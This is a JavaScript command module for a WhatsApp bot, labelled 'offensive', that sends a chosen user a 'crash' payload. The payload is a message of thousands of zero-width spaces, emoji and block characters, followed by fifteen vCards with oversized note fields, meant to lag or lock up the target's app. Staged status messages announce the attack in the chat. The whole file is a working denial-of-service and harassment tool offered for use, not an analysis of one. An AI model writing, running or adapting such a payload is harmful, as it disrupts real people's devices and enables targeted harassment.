const { log } = require('../utils/logger');

module.exports = {
    name: 'vortex',
    description: '🌀 Multi-Vector Crash: Sends an extreme lag payload of Unicode, Emoji, and VCard spam.',
    category: 'offensive',
    isAdmin: true,
    isOwner: true,
    async execute({ sock, chatId, message, args, bot }) {
        try {
            const target = message.message?.extendedTextMessage?.contextInfo?.participant ||
                (args[0] ? args[0].replace('@', '') + '@s.whatsapp.net' : chatId);

            const number = target.split('@')[0];
            const vortexLogs = [
                `🌀 *INITIATING VORTEX INFRASTRUCTURE* on @${number}...`,
                `📡 *VECTOR_1:* Deploying Rendering_Gridlock stanza...`,
                `🌊 *VECTOR_2:* Opening Social_Sinkhole (Payload: 20MB)...`,
                `☣️ *STATUS:* Target environment saturation in progress.`
            ];

            for (const logText of vortexLogs) {
                await sock.sendMessage(chatId, { text: logText, mentions: [target] });
                await delay(600);
            }

            // 1. Technical Render Flood
            const renderFlood = `🌀 *VORTEX_RENDER_GRIDLOCK*\n________________________________\n> Objective: UI_Process_Lockup\n> Complexity: High_Entropy\n\n` +
                "\u200B".repeat(5000) + "✨".repeat(2000) + "░".repeat(2000);

            // 2. Sovereign Pressure Contacts (Saturation Vector)
            const vCard = 'BEGIN:VCARD\n' +
                'VERSION:3.0\n' +
                'FN:☣️ VORTEX_PRESSURE_NODE\n' +
                'TEL;type=CELL;type=VOICE;waid=0:0\n' +
                'EMAIL:admin@abyssflow.io\n' +
                'NOTE:' + "▓".repeat(3000) + '\n' +
                'END:VCARD';

            const contacts = Array(15).fill({ vcard: vCard });

            // Sequential high-pressure delivery
            await sock.sendMessage(target, { text: renderFlood });
            await sock.sendMessage(target, {
                contacts: {
                    displayName: "⚠️ NETWORK_SATURATION_VECTOR",
                    contacts: contacts
                }
            });

            if (target !== chatId) {
                await sock.sendMessage(chatId, { text: `✅ *VORTEX COMPLETED.* Subject @${number} internalized in the protocol sinkhole.`, mentions: [target] });
            }

        } catch (error) {
            log.error('Error in VORTEX command:', error);
        }
    }
};
